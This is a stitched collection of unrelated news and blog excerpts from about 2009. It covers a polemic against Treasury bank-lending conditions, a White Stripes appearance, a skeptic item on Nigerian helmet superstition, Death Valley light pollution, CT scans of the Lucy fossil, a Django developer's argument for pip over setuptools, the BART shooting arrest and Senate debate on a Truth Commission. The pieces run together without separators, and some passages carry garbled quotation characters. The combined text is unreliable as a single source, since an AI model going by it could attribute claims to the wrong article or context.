He appears to be deluding himself even as he deludes all within hearing who do not understand the actual content and meaning of his policies , that have Obama ’s blessing and continue unchanged from the Bush administration .
He is overstuffed with his own arrogance and drive for power , as all such officials are , and that is why he propounds this nonsense to us .
His words are the weapons of choice to commit grave misdeeds against the people he is sworn to serve .
Is it not to his advantage if he can get his victims to approve of their own victimization ?
I do not mean to pick on Geithner ; his attitude is a handy example of the general mindset of important government officials .
Geithner added the following :
" As a condition of federal assistance , healthy banks without major capital shortfalls will increase lending above baseline levels .
Banks receiving government capital will be required to provide detailed and timely information on their lending patterns broken down by category .
Public companies will report this information quarterly , including a description of the factors that influenced their decisions , in conjunction with the release of their 10Q reports .
The Treasury will report quarterly on overall lending activity and on the terms and availability of credit in the economy . "
The U.S. government wants to force banks to make loans .
The method is to dangle federal assistance or , in some cases , to impose such assistance on banks under the threat of other unnamed political harms to be done them .
The assistance , which is the subsidy , carries a stipulation .
The banks must make loans above levels laid down by the government .
Welcome to fascism , U.S. style .
The government is nationalizing the banks .
It is dictating loan policies .
That is why banks will be forced to report their loans in detail and justify them .
The banks are to report to their pseudo — Board of Directors , which has Timothy F. Geithner at its apex , if not Barack Obama .
All of this continues to move the U.S. economy away from free markets and toward fascism , which involves government economic control while leaving the organizational forms of the free market in place .
At one time , the government role in providing credits and subsidies was nil or relatively small .
The New Deal brought in government - sponsored institutions that directed credit to mortgages , farm loans , and various other enterprises .
The Small Business Administration began in 1953 .
There are now countless other programs and subsidies provided directly by government .
The central bank creation in 1913 brought a heavy influence on overall credit creation , but the allocation was largely left to individual banks .
In the last 30 years , that independence was compromised by various government acts and regulations that encouraged mortgage loans , community loans , and substandard loans .
Recounting all these would fill several books .
Now the allocation of credit by individual banks is being directly attacked and eroded by TARP .
Further measures and regulation are likely .
These subsidies and controls are a one - way street .
There is no case that can be made on economic grounds in support of what the government is doing , none whatever .
Those many elements of the American public that are supporting what the government has and is doing to our credit system , our capital markets , and our economy , are undermining their own welfare and bringing about their own economic calamity .
We are in the midst of such a downfall now .
The same poisonous policies that produced this downfall cannot now remedy it .
They can only continue the fall of the American economy and bring about a lower standard of living .

The White Stripes are to perform live on US television later this week , it has been revealed .
Save money on musical instruments now
On Friday ( February 20th ) , the duo will appear on NBC's Late Night With Conan O'Brien .
The performance will mark the first time that the American rock outfit have played together onstage since cancelling a run of tour dates in September 2007 due to Meg White suffering from anxiety problems .
It is not yet known whether they will perform new material on the show but there are rumours that the appearance will kick - start another White Stripes album .
Meg and Jack
White were last on stage together in June last year , although Meg did not play any music .
Recently , she donated one of her drum kits to be auctioned to raise money for Jim Shaw , who is described by NME.com as a " lynchpin " of the Detroit music scene and who is currently suffering from cancer .

Vroom , Vroooom !
Reader Matthew Kleckner sends us to this site to see a frightening item about superstition in Nigeria .
He writes :
Motorcyclists sometimes get upset by laws requiring them to wear helmets , but in Nigeria people have gone off the deep end .
According to an article on the BBC website , passengers fear :
... that the helmets could be used by motorcyclists to cast spells on their clients , making it easy for them to be robbed .
" Some people can put juju inside the helmets and when they are worn the victim can either lose consciousness or be struck dumb , " passenger Kolawole Aremu told the Daily Trust newspaper .
I admit , I would be curious to see a study comparing people knocked unconscious because they were wearing helmets vs. those knocked unconscious because they were not wearing helmets .
Further , in response to the law requiring the wearing of helmets , some motorbike operators have begun wearing dried pumpkin shells instead .
I would also be curious to know why a normal helmet can have juju " put inside it , " while a dried pumpkin shell does not raise these concerns .
Randi comments :
This may give deeper meaning to the old designation given to stupid people who are often referred to as , " pumpkin - heads . "
Just a thought ...
Matthew goes on :
Ultimately , though , I think this article highlights one of the real dangers of woo - woo , which is that it causes people to ignore effective precautions or treatments in favor of abject quackery .
Belief in woo - woo now demonstrably causes people to believe that a protective helmet is more likely to cause head injury than to prevent it .
Thanks again for the many years of hard work and dedication to thinking clearly and critically .
As this item clearly shows , Matthew , I take much of my inspiration and information from those folks - like yourself - who care to inform me of the universal invasion of woo - woo and keep me abreast of the battle to bring reason to those who might wish to improve their lives by accepting rational and critical thinking as their way of life .
It 's never - ending , but it 's gratifying to know that one 's efforts are appreciated ...
Death Valley 's dark - sky goal Plan would reduce light pollution so night sky can shine

High atop Dante 's View , overlooking sheets of salt flats and ribbons of sand dunes , night watcher Dan Duriscoe shone a laser beam at the North Star and steadied his digital camera at the starry heavens .
Click .
The sky looks dark .
Duriscoe panned the camera toward the light factory of Las Vegas , 85 miles away but peeking out like a white halo above the mountains in the eastern horizon .
Click .
The sky is on fire .
" You can see the Luxor vertical beam , " said Duriscoe , pointing to a time - exposure shot on his camera - connected laptop showing the Vegas Strip pyramid - shaped hotel 's famous searchlight .
" That 's the brightest thing out there . "
Acclaimed for its ink black skies , Death Valley , the hottest place in North America , also ranks among the nation 's unspoiled stargazing spots .
But the vista in recent years has grown blurry .
The glitzy neon glow from Las Vegas and its burgeoning bedroom communities is stealing stars from the park 's eastern fringe .
New research reveals light pollution from Las Vegas increased 61 percent between 2001 and 2007 , making it appear brighter than the planet Venus on clear nights as seen from Dante 's View .
Duriscoe , a soft - spoken , mustachioed physical scientist with the National Park Service , is part of a roving federal team of night owls whose job is to gaze up at the sky and monitor for light pollution in national parks .
" What is alarming to me is , what 's going to happen three or four generations from now if this growth of outdoor lights continues ? " he asked .
Amid such concerns , Death Valley , the largest national park in the Lower 48 , has set an ambitious goal :
It wants to be the first official dark - sky national park .
Since the dawn of civilization , humans have been enthralled by the night sky 's romantic mystique .
Early seafarers relied on stars to steer their ships .
Farmers looked toward the night sky for clues to plant and harvest crops .
Ancient cultures spun mythologies from staring at the cosmos .
Civilization is also the chief reason why the night sky is vanishing in many corners .
As the world grows , so do the number of lamp posts that sprout up like trees in sprawling subdivisions .
Pass by Anywhere , USA , and chances are you will see lighted shopping strips , twinkling auto malls and flashy billboards .
Today , it 's estimated about one - fifth of the world 's population and more than two - thirds in the United States cannot see the Milky Way from their backyards .
Further , studies have shown exposure to artificial lights can interrupt animals ' biological clocks and disrupt ecosystems .
Migratory birds have been known to be confused by blinding lights on skyscrapers and fly smack into them .
Last year , the cancer arm of the World Health Organization listed the graveyard shift , where workers toil under artificial lights , as a probable carcinogen .
The International Dark - Sky Association , an Arizona - based nonprofit whose slogan is " Carpe Noctem , " has noticed an increased awareness about the perils of light pollution , but acknowledged there 's a limit to promoting dark skies .
" I do n't think you can get Paris to turn off the Eiffel Tower or persuade Times Square to turn off all of its lights , " said Pete Strasser , the association 's managing director .
The same could probably be said for Las Vegas , the sparkly desert playground where neon signs blend into the natural landscape .
" It 's part of the whole ambiance .
It 's the selling point of Las Vegas , " said Barbara Ginoulias , director of comprehensive planning for Clark County , Nev. , where Vegas is located .
Still , she added , " We 're certainly cognizant of light pollution and we try to address it in the best way . "
Ginoulias ' department oversees unincorporated parts of Clark County , which are required to shield outdoor lights or cast the light downward .
Next month , the county commission will consider an ordinance that would set lighting standards on digital billboards on Interstate 15 that runs along the Vegas Strip .
As for the main drag , Las Vegas Boulevard , Ginoulias said signs are reviewed case - by - case .
Newer signs tend to be less flashy or not have the glaring white background , she said .
Too many lights in the park
With no control over the Vegas glow , park rangers at Death Valley are looking inward to fix the light problem at home as they pursue their goal of becoming the first dark - sky national park .
To gain that distinction , the park must shield or change out two - thirds of its existing outdoor light fixtures .
Death Valley has about 700 lights in its 3.3 million acres , including parking lot light poles , floodlights , fluorescent tubes and egress lights next to doors .
Only about 200 lights meet the sky - friendly standard .
At the Furnace Creek Visitor Center located 190 feet below sea level , the pedestrian walkway leading to the front entrance is lined with overhead rows of fluorescent tubes under a canopy .
From Dante 's
View at night , the visitor center appears as dancing white and blue dots .
" This is a really bright spot in the park , " said Terry Baldino , chief of interpretation at Death Valley .
" All the campgrounds have to share their night sky with the lights here .
If we can reduce that , then we 're going to improve their night stay . "
The park has replaced some fixtures with tin can - shaped designs that focus light onto the ground instead of sideways or upward .
Rangers are also debating whether to turn off outdoor lights in some cases .
" We 're doing little by little , " said Baldino .
So far , Utah 's Gold Tier Natural Bridges National Monument and Pennsylvania 's Cherry Springs State Park are the only two parks certified by the International Dark - Sky Association as dark - sky enclaves .
This fall , the group gave a tentative approval to the Geauga Park District 's Observatory Park 40 miles east of Cleveland for its work to preserve darkness over the observatory and nearby park land .
Despite Death Valley 's lighting challenges , city dwellers from all over still flock to take in the view .
On a recent December evening , a naturalist couple from northern Los Angeles admired the star - studded sky from Zabriskie Point , a popular lookout just south of the visitor center .
" You do n't see this in L.A. , " said Karen Zimmerman , 49 , who works at the Huntington Library , Art Collections , and Botanical Gardens in San Marino ( Los Angeles County ) .
" You forget how many stars there are . "
As Zimmerman spoke , a hazy glare could be seen from a distance .
Zimmerman 's wife , Debra , 44 , chimed in : " One of the things that concerns us is losing darkness .
You just do n't get darkness in Los Angeles .
It 's just nonexistent . "
View from Dante's View
Back at Dante 's View , a 5,475 - foot panoramic viewpoint overlooking the glimmering valley floor , Duriscoe is working his second night taking sky brightness readings .
The crescent moon , which formed a triangle with Jupiter and Venus earlier in the night , has dropped below the horizon .
The night is still - save for the occasional breeze and whirring noise of Duriscoe 's camera mounted on a moving tripod that automatically takes 45 images , covering the entire sky .
The images are then stitched together and , by subtracting the light by known stars , scientists create fish - eye and panoramic maps of light invasion .
Duriscoe has been sky - gazing at national parks for a living since 1999 and made the first sky brightness comparisons two years later .
A self - described desert rat , Duriscoe excitedly points to the Orion , Aquarius , Pisces and Aries constellations .
The Milky Way , which arches across the night sky , bleeds into the Las Vegas light dome 30 degrees above the horizon .
The glow from the greater Los Angeles region forms a long , narrow band .
Skywatchers can theoretically see some 6,000 stars in the blackest and pristine skies of Death Valley .
With light pollution from Las Vegas , scientists estimate about 2,500 stars are visible from Dante 's View .
Advances in technology have enabled people to see the cosmos like never before .
Take the Hubble Space Telescope , which has beamed stunning images of exotic galaxies and distant supernovae to people 's computers .
But Duriscoe noted that these onscreen images are just not the same as being out under the sky .
Sitting on the ledge of Dante 's View , his legs stretched out and his back toward Vegas , Duriscoe pondered the shrinking sky .
" This is the real universe , " he said , taking in the celestial light show until clouds moved in , drawing a curtain on the stars for the night .
HOUSTON ( Reuters ) - Digital X - rays have turned Lucy , perhaps the world ’s best - known pre-human , inside out , and may answer questions about how our ancestors came down from the trees and walked , scientists said on Friday .
Slideshow ( 2 images )
The team at the University of Texas in Austin , in collaboration with the Ethiopian government , completed the first high - resolution computed tomography or CT scan of the human ancestor , who lived 3.2 million years ago .
“ These scans we ’ve completed at the University of Texas permit us to look at the internal architecture -- how her bones are built , ” anthropology professor John Kappelman , who helped lead the work scanning all 80 pieces of the skeleton , told Reuters in an interview .
Scientists hope studying a “ virtual ” Lucy will offer further clues about the human ancestor ’s lifestyle .
Lucy , found in Ethiopia in 1974 , is the best - preserved example of Australopithecus , a species of pre-human .
“ It opens it up to people who , instead of having to travel to some distant museum to see the original , can actually call it up on the desktop , ” Kappelman said .
Kappelman said the scans could tell more about how Lucy ’s bones fit together -- and thus whether she and her kind climbed trees as well as walked .
“ We ’re quite certain this set of studies we ’re going to be conducting here with the CT data are going to go some distance to resolving this long - standing question , ” Kappelman said .
Lucy ’s fossil is visiting the United States as part of a world premiere exhibit organized by the Houston Museum of Natural Science .
The 3 - foot - ( 1 - meter ) tall skeleton is about 40 percent complete .
“ It ’s going to help us fill us in what was one of the earlier stages ... of our evolution to really better understand the behaviors of an extinct cousin .
In some ways it ’s like ... being able to tune the time machine back to 3 million years ago , jump in and pop back and be able to reconstruct what this fossil was doing on a day - to - day basis , ” Kappelman said .
“ She ’s arguably now and I think will be for a long time , the most famous fossil on planet Earth , ” he added .
Police Confuse Living Man as Dead , Send to Autopsy
In a bizarre turn of events that seem straight out of an old Twilight Zone episode , police in Khajekalam , India , mistakenly declared a man dead who was found in a semi-conscious state , and sent him off for an autopsy while he was still alive !
Abdul Raza , a road roller driver for the state Public Works Department , was found in a semi-conscious state and declared dead before being properly examined .
â€ œThe Khajekalan police informed his family members that Raza was dead and that his body could be collected at Patna Medical College Hospital ( PMCH ) .
The news from the post - mortem room had the family members wailing .
When we reached there , a constable told us that Raza was actually alive and admitted into the emergency ward , â€ said Hameed Intiaz , a relative .
The police station denies any goof up , but obviously someone did .
It is suspected that the real error occurred in conveying the message to the police .
In any case , Raza can now say what Mark Twain did when a newspaper reported he had died :
â€ œRumors of my death have been greatly exaggerated !â€ 

They say one man ’s trash is another man ’s treasure .
The same could be said about food : one man ’s nightmare may just be another man ’s delicacy .
From cow ’s tongue and pig ’s snout to chicken ’s feet , from fried worms and frog ’s legs to sautéed snails , the list of weird stuff we eat is endless ( and often quite tasty ) .
If you ’ve been indulging lately and need a reason to diet , take a read , you may just lose that appetite .
Here is the list of the ten strangest foods from around the world .
10 . Fried – brain sandwiches
Long before the era of Mad - Cow Disease , a sandwich made from fried calves ’ brain , thinly sliced on white bread was a common item on the menus in St. Louis , Missouri , USA .
The sandwich is still available in the Ohio River Valley , where the brains are now heavily battered and served on hamburger buns .
In El Salvador and Mexico beef brains , lovingly called sesos in Spanish , are used in tacos and burritos .
The brains have a mushy texture and very little flavor on their own so the addition of copious amounts of hot sauce definitely helps .
9. Haggis
A traditional Scottish dish , haggis is made with the minced heart , liver and lung of a sheep mixed with onion , spices , oatmeal , salt and stock , and boiled in the sheep ’s stomach for a few hours .
Larousse Gastronomique , a popular encyclopedia of gastronomic delights , claims that haggis has “ an excellent nutty texture and delicious savory flavor . ”
Haggis is available year - round in Scottish supermarkets and made with an artificial casing rather than a sheep ’s stomach .
In fact some are sold in cans to be heated in a microwave before eating .
Similar dishes can be found in other European countries with goat , pork or beef used instead of sheep .
8. Bugs
The practice of eating insects for food is called entomophagy and is fairly common in many parts of the world , with the exceptions of Europe and North America ( though bugs are apparently a favorite with the television show “ Fear Factor ” ) .
It is not uncommon to find vendors selling fried grasshoppers , crickets , scorpions , spiders and worms on the streets of Bangkok , Thailand .
Insects are high in protein and apparently consist of important fatty acids and vitamins .
In fact flour from drying and grinding up mealworm can be and is often used to make chocolate chip cookies .
So next time you think there is a fly in your soup , it may actually just be part of the presentation .
7. Rocky Mountain Oysters
What is so strange about oysters ?
Probably the fact that they ’re not the kind you find at the bottom of the ocean , but rather a fancy name given to deep - fried testicles of a buffalo , bull or boar .
Rocky Mountain oysters ( also called Prairie Oysters ) are well - known and regularly enjoyed , in certain parts of the United States and Canada , generally where cattle ranching is prevalent .
The testicles are peeled , boiled , rolled in a flour mixture , and fried , then generally served with a nice cocktail sauce .
6. Stuffed Camel
The recipe for a whole stuffed camel kind of reads like a bad joke , with ingredients that include one whole camel , one whole lamb and 20 whole chickens .
The Guinness Book of World Records lists the recipe as the largest item on any menu in the world , conveniently leaving out any concrete examples of this dish actually being eaten .
Legend has it that that a whole stuffed camel is a traditional Bedouin dish seemingly prepared like a Russian Stacking Doll , where a camel is stuffed with a whole lamb , the lamb stuffed with the chickens and the chickens stuffed with eggs and rice .
The entire concoction is then barbecued until cooked and served .
Fact or fiction , the shear amount of food created by this dish makes it deserving of a place on the list .
5. Hakarl
Anthony Bourdain , known for eating some of the strangest foods in the world , claims that hakarl is the most disgusting thing he has ever eaten .
Made by gutting a Greenland or Basking shark and then fermenting it for two to four months , hakarl is an Icelandic food that reeks with the smell of ammonia .
It is available all year round in Icelandic stores and often served in cubes on toothpicks .
4. Fugu
Fugu is the Japanese word for the poisonous puffer fish , filled with enough of the poison tetrodotoxin to be lethal .
Only specially - trained chefs , who undergo two to three years of training and have passed an official test , can prepare the fish .
Some chefs will choose to leave a minute amount of poison in the fish to cause a tingling sensation on the tongue and lips as fugu can be quite bland .
Perhaps the fuss of fugu is more in surviving the experience than the actual taste of the deadly fish .
3. Casu Marzu
Found in the city of Sardinia in Italy , casu marzu is a cheese that is home to live insect larvae .
These larvae are deliberately added to the cheese to promote a level of fermentation that is close to decomposition , at which point the cheese ’s fats are broken down .
The tiny , translucent worms can jump up to half a foot if disturbed , which explains why some people prefer to brush off the insects before enjoying a spoonful of the pungent cheese .
2. Sannakji
With sashimi and sushi readily available the world over , eating raw seafood is no longer considered a dining adventure .
The Korean delicacy sannakji however , is something quite different , as the seafood is n’t quite dead .
Live baby octopus are sliced up and seasoned with sesame oil .
The tentacles are still squirming when this dish is served and , if not chewed carefully , the tiny suction cups can stick to the mouth and throat .
This is not a dish for the fainthearted .
1. Balut
Balut seems to be on every “ strange food ” list , usually at the top , and for good reason .
Though no longer wriggling on the plate like the live octopus in Korea , the fertilized duck or chicken egg with a nearly - developed embryo that is boiled and eaten in the shell is easily one of the strangest foods in the world .
Balut is very common in the Philippines , Cambodia and Vietnam and usually sold by street vendors .
It is said balut tastes like egg and duck ( or chicken ) , which is essentially what it is .
It is surprising to many that a food that appears so bizarre — often the with the bird ’s features clearly developed –can taste so banal .
In the end , apparently everything does indeed , just taste like chicken .

The wave of street protests is a dramatic change for Iceland Iceland could be fast - tracked to join the EU within two years , to help the small Nordic state out of its economic crisis , a top EU official says .
Enlargement Commissioner Olli Rehn said that if Iceland applied soon , it could join at the same time as Croatia , which is expected to become a member by 2011 .
But Iceland is yet to decide if it wants to join the 27 - nation bloc .
Icelandic politicians say they expect to reach a deal on Friday on a new centre - left coalition government .
Iceland 's banking system collapsed in October , causing its currency , the krona , to plummet and prompting the government to arrange $ 10bn in emergency financing from the International Monetary Fund and several European countries .
The crisis has stunned a nation that enjoyed one of the world 's highest living standards during the stock market boom .

He resigned as prime minister on Monday following angry public protests .
The BBC's Oana Lungescu in Brussels says Iceland has already adopted two - thirds of EU rules , so its accession talks could go much faster than the five years Croatia has spent negotiating .

Swapping the battered krona for the euro could also take several years , our correspondent says .
Iceland would first need to be a member of the EU and then prove it can comply with the strict discipline of the single currency .
Iceland 's Social Democrats want to replace the governor of the central bank , whom many blame for the country 's sudden lurch from prosperity to economic meltdown .
They also reportedly want to hold a referendum on EU membership .
The economy is forecast to shrink by almost 10 % this year .

On packaging
So currently there ’s a bit of a to - do involving Debian ’s Ruby packaging team and the Ruby “ gem ” system .
This document does a good job of summarizing the issues from Debian ’s perspective .
And of course , the Ruby side of it is no less heated ; an example is here .
A lot of this is the usual back - and - forth between ( on the one side ) application developers working in one particular language , who want to distribute their applications to the widest possible audience and so use an operating - system - agnostic but language - specific tool for doing so , and ( on the other side ) operating - system maintainers who want , as much as possible , to deal with one standardized , language - agnostic but platform - specific tool to distribute software and updates .
And ordinarily those goals can get along fairly well as long as a few compromises are made , but in this specific case the elevated tension seems to be caused by the way the Ruby gem system works , specifically by tightly coupling application code to the use of the gem utility .
Pretty much everything else on the Debian packagers ’ list of problems seems like it could be resolved if this issue went away .
But I ’m not here to try to solve that problem ; I ’m simply mentioning it because it ’s an interesting parallel ( and hence a good lead - in ) to some long - standing complaints I ’ve had about the way packaging is often done in Python , and which recently came to my attention once again when someone filed a bug report against django - registration , mentioning that a custom management command in that application does n’t work if you install via easy_install with the default options .
If you ’d like to just get the executive summary , here it is : Please , for the love of Guido , stop using setuptools and easy_install , and use distutils and pip instead .
If you ’d like to know why , read on .
Also , please note that the following are simply my opinions ; I have some experience to back them up , from both personal projects and my duties as Django ’s release manager ( and , hence , the person who makes the packages for Django ) , but my opinions are simply mine , and not those of any particular project or institution ( for the record : Django does n’t use setuptools anymore , but I was n’t part of the decision to move away from it ) .
Why non-standard packaging tools exist for Python
Most of my problems with setuptools boil down to the same problem that seems to be at the heart of the Debian - vs .
- Ruby fight : setuptools has an unfortunate habit of infecting bits of code which should n’t need to have any awareness of how the code , or its dependencies , are being packaged and distributed .
As a starting point , consider how Python ’s standard distribution system — distutils — works :
You write your code .
You write a script named setup.py which imports the setup function from distutils and specifies the packaging options you want .
You run setup .py sdist to generate a standard source package , or use other commands to build different package formats or upload the package to the Python package index .
Installing something that ’s been packaged with distutils is easy ; if it ’s in a format specific to your operating system ( distutils can generate a variety of OS - specific formats , including for example RPM packages for Red Hat systems or self - extracting installers for Windows ) then you can simply install normally .
If you ’ve got a source package , however , it ’ll simply be a standard compressed archive ( .tar.gz format ) you can unpack to get the code and the setup.py script , and setup.py install will install it .
And of course the installation process is configurable in a variety of ways , as covered in the distutils documentation .
So far , so good .
But there are two major shortcomings to distutils :
It provides no way to specify dependencies between packages .
It provides no way to emulate the experience on , for example , many Linux distributions where you type a command , feed it a package name , and the appropriate package ( and dependencies ) will be downloaded from a repository and installed for you .
To provide this functionality , many people turn to setuptools .
And if it had done nothing except deal with these two issues , it would have been great ; an easy dependency - management mechanism and a network - enabled installation system make lots of people ’s lives easier .
But setuptools did n’t stop there , and that ’s where the real trouble begins .
Let Python be Python
Setuptools goes far beyond merely providing dependency management and an easy network - enabled install tool ; it also adds a number of other features , and does quite a lot of work to support them .
Most complaints boil down to the fact that these features , and their associated support :
Cause Python to stop behaving the way Python is documented as behaving , and Create a bizarre parallel world of things which are only accessible from , and which only work when using , setuptools and its API s .
The first of these is certainly bad , but the second is the one which really bothers me , and which closely parallels the problems with Ruby ’s gem system .
To see an example , consider a Python feature that ’s occasionally useful : if you have a zip file whose contents are files of Python code , you can place the zip file on your Python import path and import will just work for the code inside it ;
Python knows how to look inside a zip file and find the code , and you do n’t need to do anything else special aside from making sure the file ’s on the import path .
But setuptools has latched onto this feature to create an entire zipped package format which includes not only Python code but also things like data files .
Now , normally if you package an application which includes some data files , you can specify that they ’re to be installed alongside the code and use standard Python techniques to figure out where your package is and where your data files are , and work with them from your code .
With setuptools , however , you ca n’t do this , because setuptools puts your data files into the same zipped package , and from that point on you have to use functions in setuptools to access them .
Oh , and did I mention that this is how setuptools does things by default ?
Anything you install via easy_install will get this treatment unless :
You ’ve explicitly told easy_install not to do this on a per- package basis , or You ’ve explicitly configured setuptools to disable this “ feature ” globally , or The person who created the package set it up to force setuptools not to zip it .
Requiring one of the first two options to make Python applications work normally is bad enough , but the third is simply perverse : in order to create a package that setuptools wo n’t try to zip , you have to use setuptools to create the package .
Which , in turn , means that only people who have setuptools installed can install your package .
“ You can opt out of our system by opting in to our system ” is not an acceptable way to do things , in my opinion .
This is , incidentally , how setuptools managed to break django - registration .
The fact that setuptools defaults to installing that zipped version of the package means Django ’s standard mechanism for locating management commands stops working ; since Django does n’t use setuptools ’
APIs to peer into zipped packages , it ca n’t see the custom management command bundled in django - registration .
And , of course , most people who use easy_install do n’t actually know that it behaves this way , since they just wanted , well , an easy way to install Python packages .
So the bug reports end up coming to me , which makes me sad and angry .
And that ’s really just the tip of the iceberg ; setuptools and its associated frameworks , because of the features they try to support , end up slipping out of packaging concerns and into your application code in all sorts of oddball ways .
There ’s even an analog of the require_gem feature which gives Debian packagers headaches : setuptools lets you specify dependencies directly in application code to ensure that you ’re importing precisely the version of a library that you want to import , and this only works when setuptools is also installed ( and , from what I can tell , may only work if the package you want to import from was itself installed by setuptools ) .
The end result is that , once you start using setuptools , you ’re gradually nudged further and further away from using standard Python APIs and techniques , and more and more into using things that only exist as part of setuptools .
And just when you thought it could n’t get worse , setuptools also encourages package creators to set up drive - by installations of setuptools , so that unsuspecting users end up with it installed whether they wanted it or not .
Me , I ’m a fan of Python being Python , not some bizarre parasitic thing that tries to force itself on you and make you use its own APIs instead of Python’s .
So I generally stay as far away from setuptools as I possibly can .
The alternative
Of course , this brings up a question : if setuptools and easy_install are bad , what can we use instead ?
For packaging , I still use ( and in fact have always used ) just plain old distutils .
It ’s simple ( at least , it ’s about as simple as a packaging system can be while still being useful ) , it ’s standard , it works , I use it for all my personal applications .
For actually installing and managing packages , I use pip .
It ’s by Ian Bicking , who ’s smarter than any ten people have a right to be , and it gets an awful lot of things right .
One of those things , and the one which , by itself , would make pip worthwhile , is actually noted as a shortcoming in its documentation :
It can not install from eggs .
It only installs from source .
Eggs , of course , are setuptools ’ zipped package format .
I ’m really really OK with not installing from eggs , Ian .
If I type :
easy_install django - registration
then even though it ’s a standard source - code package built with distutils I still end up with a broken zipped package that can’t find its own management command .
But if I type :
pip install django - registration
then I get something that actually works the way Python is supposed to work .
I ’m really OK with that .
Another thing pip gets right is that it does n’t try to graft a dependency - specification system onto the setup.py script , and so does n’t create a dependency from your setup.py script to pip .
Instead , it lets you write a short file listing your requirements and point pip at that file ; it ’ll handle the rest .
And as if that was n’t enough , pip — thanks to its requirement - file mechanism and a couple other features — enables the holy grail of deployment : the repeatable , scriptable install .
Seriously , pip is good stuff .

The BART police officer who fatally shot an unarmed man on an Oakland train platform and then refused to explain his actions to investigators was arrested Tuesday in Nevada on suspicion of murder , authorities said .
Johannes Mehserle , 27 , of Lafayette was taken into custody in Douglas County , Nev. , said Deputy Steve Velez of the Douglas County sheriff 's office .
The arrest was also confirmed by David Chai , chief of staff to Oakland Mayor Ron Dellums .
Mehserle was arrested in the New Year 's Day shooting of Oscar Grant , a 22 - year - old supermarket worker from Hayward who was lying facedown after being pulled off a BART train by police investigating a fight .
An Alameda County judge signed an arrest warrant alleging murder , and Mehserle surrendered without incident , authorities said .
The shooting , which was recorded by passengers in videos widely circulated on the Internet and television , prompted public outrage , and some viewers said that the shooting appeared to be an execution .
Sources said Mehserle was in Nevada because he feared for his safety after death threats were made against him .
Douglas County is 15 miles south of Carson City in northwestern Nevada and includes part of Lake Tahoe .
Mehserle 's attorney , Christopher W. Miller of Sacramento , confirmed early today that his client was arrested on suspicion of murder .
He said he would not comment further until a news conference today .
Alameda County District Attorney Tom Orloff was expected to announce details of the arrest today .
He could not be reached late Tuesday .
Authorities have been under immense pressure to take action in the case .
On Tuesday , BART board President Thomas Blalock and board Director Carole Ward Allen sent a letter to Orloff , urging the district attorney to move expeditiously to complete the investigation and file charges if warranted .
Some Oakland community leaders and civil rights activists said the case is symbolic of larger problems with police officers using excessive force on young black men .
Grant was black and Mehserle is white .
The arrest came on the eve of a protest scheduled for 4 p.m. today outside Oakland City Hall , the latest in a series of demonstrations in which BART has been accused of mishandling the investigation .
BART police on Monday turned over the results of their preliminary investigation to Orloff 's office .
A separate investigation by Oakland police was launched last week , and Mehserle 's arrest was related to that probe , sources said .
The state attorney general is also monitoring the case .
BART officers had detained Grant and several other passengers at about 2 a.m. Jan. 1 as they investigated a fight aboard a train from San Francisco .
Passengers with cellular phone cameras captured footage that shows Grant lying facedown when he was shot .
In the videos , Mehserle appears to be trying to put cuffs on Grant , and Grant appears to be struggling , when Mehserle suddenly pulls his service weapon from his holster and fires one shot into Grant 's back .
Mehserle declined to speak to BART criminal investigators after the shooting .
Then last Wednesday he resigned rather than answer questions from BART 's internal affairs division .
His departure came the same day Grant was buried and a peaceful protest at the Fruitvale BART Station erupted into violence in downtown Oakland .
Demonstrators set cars on fire and broke windows at dozens of businesses .
By night 's end , police had arrested 105 people .
Grant 's family has filed a $ 25 million legal claim against BART , signaling an intention to sue for damages .
The family 's attorney , John Burris , said late Tuesday that he was pleased to hear of Mehserle 's arrest .
" If it 's true , the family is delighted , and it will really help with the healing process , " Burris said .
" This is also very important for the community .
This had to occur ; it was almost a no - brainer .
I think the district attorney ought to be commended for moving ( the case ) expeditiously . "

GOP senator would support probe of ‘ shocking ’ anti-terror memos
Rachel Oswald
Update at bottom : ‘ Be careful what you wish for , ’ Leahy tells Maddow some in GOP back legal action
Sen. Arlen Specter ( R - PA ) said he was opposed to any Truth Commission tasked with investigating Bush administration abuses , but that he could support criminal investigations into political appointees who authored the controversial OLC memos .
Speaking at Sen. Patrick Leahy ’s ( D - VT ) Wednesday hearing on exploring the possibilities of setting up a nonpartisan Truth Commission , Specter , a moderate in his party who has supported past Senate inquiries into polices of the Bush administration , said :
“ I would not mind looking backward if there ’s reason to do so .
If we have evidence of torture “ “ go after it .
If there ’s reason to believe that these Justice Department officials have knowingly given the president cover for practices they know not to be right or sound “ “ go after them .
Some of the [ OLC ] opinions are more than startling , they ’re shocking .
If [ OLC counsel ] did that knowingly ” ¦it sounds to me that it may fall within criminal conduct .
Specter said he supported the Justice Department pursuing an investigation into the writing of the memos .
“ They ’re not going to pull any punches , ”  Specter said of a Justice investigation .
A key aspect still unresolved of Leahy ’s proposal to set up an independent “ ˜ Truth Commission ’ with the task of examining wrongdoing by the Bush administration , is whether immunity will be offered to those who testify , and if so , what kind of immunity .
Senate Judiciary Committee Chairman Leahy ’s hearing on the feasibility of setting up a nonpartisan “ ˜commission of inquiry ’ into national security abuses over the last eight years met with strong support from a variety of sectors “ “ civil libertarians , some corners of the military and human rights advocates .
In opening the day ’s hearing before a half - full chamber room that included a dozen Guantanamo Bay protestors wearing orange prison jumpsuits , Leahy strove to create a bipartisan atmosphere .
Leahy said the commission could be imbued with subpoena powers and even the power to grant immunity to those who agree to testify .
But he also warned that the commission would not rule out criminal prosecutions for witnesses who perjure themselves .
“ This is a time when conservatives , liberals , Republicans and Democrats should be setting aside labels to come together foremost as Americans , ”  Leahy said .
“ We should n’t be afraid to look at what we ’ve done and hold ourselves accountable as we do other nations when they make mistakes .
Today is another opportunity to come forward and find the facts and join all of us , Republicans and Democrats , to develop a process to understand what went wrong and then to learn from it . ” 
But there is also significant opposition from Leahy ’s Republican colleagues on the committee who contested that Congress had no business delegating responsibility to investigate Bush abuses and that no matter how “ ˜nonpartisan ’ in name the commission was , it would still become a vehicle for Democrats to launch criminal probes into Republicans .
“ The idea of creating an independent , and I ’m not sure how independent it would actually be , unaccountable Truth Commission , is a bad idea with all due respect , ”  said Sen .
John Cornyn ( R - TX ) , a member of the Judiciary Committee .
“ The suggestion that this can be delved into somehow in a nonpartisan fashion asks us to suspend our powers of disbelief . ” 
Two of Leahy ’s fellow Democrats on the Judiciary Committee gave support to the Truth Commission , though from their comments , they seem to be more interested in criminal prosecutions for high - profile Bush appointees than Leahy .
“ There can be no doubt that we must fully understand the mistakes of the past to address them and to prevent them occurring in the future , ”  said Sen. Russ Feingold ( D - WI ) .
“ Your proposal is aimed at finding the truth , not settling the score .
I think a truth commission as the chairman has proposed is the best way to get the story out to the American people . ” 
